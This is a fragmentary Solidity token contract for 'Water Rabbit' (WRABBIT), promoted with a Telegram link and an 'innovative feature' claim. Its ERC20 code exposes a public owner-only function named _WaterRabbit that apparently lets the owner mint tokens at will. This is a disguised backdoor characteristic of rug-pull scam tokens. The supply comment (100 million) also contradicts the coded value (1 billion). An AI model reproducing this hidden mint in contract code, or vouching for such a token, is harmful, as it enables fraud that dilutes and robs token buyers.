...
//
// $WaterRabbit proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/WaterRabbitt
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _WaterRabbit(uint256 amount) public onlyOwner {
 _WaterRabbit(msg.sender, amount);
    }
    ...
    function _WaterRabbit(address account, uint256 amount) internal virtual {
...
contract $WaterRabbit is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Water Rabbit", "WRABBIT") {
     _WaterRabbit(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}